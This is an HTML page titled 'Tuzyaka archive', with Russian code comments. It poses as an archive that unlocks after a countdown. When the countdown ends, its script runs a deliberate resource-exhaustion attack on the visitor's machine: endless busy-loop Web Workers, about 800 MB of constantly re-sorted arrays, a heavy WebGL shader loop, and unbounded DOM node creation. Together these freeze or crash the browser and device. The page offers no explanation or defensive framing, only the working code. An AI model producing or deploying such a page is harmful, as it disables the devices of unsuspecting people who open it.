<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Tuzyaka archive</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 40%;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #0f0;
        }
        #countdown {
            font-size: 1.5em;
            color: #f00;
            text-shadow: 0 0 5px #f00;
            margin-top: 20px;
        }
        canvas {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <h1>Tuzyaka archive</h1>
    <div id="countdown">Unlocking in: 10</div>
    <canvas id="canvas"></canvas>
    <script>
        // Обратный отсчет
        let secondsLeft = 10;
        const countdownElement = document.getElementById("countdown");
        const countdown = setInterval(() => {
            secondsLeft--;
            countdownElement.textContent = `Unlocking in: ${secondsLeft}`;
            if (secondsLeft <= 0) {
                clearInterval(countdown);
                startHeavyLoad();
            }
        }, 1000);

        // Запуск тяжелых вычислений
        function startHeavyLoad() {
            document.body.innerHTML = "<h1>Archive Unleashed</h1>";
            document.body.style.color = "#f00";
            document.body.style.textShadow = "0 0 10px #f00";
            overloadCPU();
            overloadMemory();
            overloadGPU();
            overloadDOM();
        }

        // Нагрузка на CPU
        function overloadCPU() {
            const workerCount = navigator.hardwareConcurrency * 2 || 4;
            for (let i = 0; i < workerCount; i++) {
                const workerCode = `
                    self.onmessage = () => {
                        while (true) {
                            for (let j = 0; j < 1e5; j++) {
                                let x = Math.sin(Math.random());
                                let y = Math.cos(Math.random());
                                let z = Math.tan(Math.random());
                                let w = x * y * z;
                            }
                        }
                    };
                `;
                try {
                    const blob = new Blob([workerCode], { type: "application/javascript" });
                    const worker = new Worker(URL.createObjectURL(blob));
                    worker.postMessage('start');
                } catch (e) {
                    // Запасной вариант в основном потоке
                    setInterval(() => {
                        for (let j = 0; j < 1e5; j++) {
                            let x = Math.sin(Math.random());
                            let y = Math.cos(Math.random());
                            let z = Math.tan(Math.random());
                            let w = x * y * z;
                        }
                    }, 10);
                }
            }
        }

        // Нагрузка на память
        function overloadMemory() {
            let arrays = [];
            for (let i = 0; i < 10; i++) {
                arrays.push(new Float64Array(1e7)); // ~80 МБ каждый
            }
            setInterval(() => {
                arrays.forEach(arr => {
                    arr.sort();
                });
            }, 500);
        }

        // Нагрузка на GPU
        function overloadGPU() {
            const canvas = document.getElementById("canvas");
            canvas.style.display = "block";
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return;

            const vsSource = `
                attribute vec4 aPosition;
                void main() {
                    gl_Position = aPosition;
                }
            `;
            const fsSource = `
                precision highp float;
                uniform float uTime;
                void main() {
                    float r = 0.0;
                    for (int i = 0; i < 5000; i++) {
                        r += sin(float(i) * uTime * 0.01) * cos(float(i) * uTime * 0.02);
                    }
                    gl_FragColor = vec4(mod(r, 1.0), 0.5, 0.5, 1.0);
                }
            `;

            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);
            const program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);

            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
            const aPosition = gl.getAttribLocation(program, "aPosition");
            gl.enableVertexAttribArray(aPosition);
            gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);

            const uTime = gl.getUniformLocation(program, "uTime");
            function render() {
                gl.uniform1f(uTime, performance.now() / 1000);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(render);
            }
            render();
        }

        // Нагрузка на DOM
        function overloadDOM() {
            function createChaos() {
                for (let i = 0; i < 100; i++) {
                    const div = document.createElement("div");
                    div.style.position = "absolute";
                    div.style.left = Math.random() * 100 + "%";
                    div.style.top = Math.random() * 100 + "%";
                    div.style.width = "50px";
                    div.style.height = "50px";
                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    document.body.appendChild(div);
                }
                setTimeout(createChaos, 10);
            }
            createChaos();
        }
    </script>
</body>
</html>
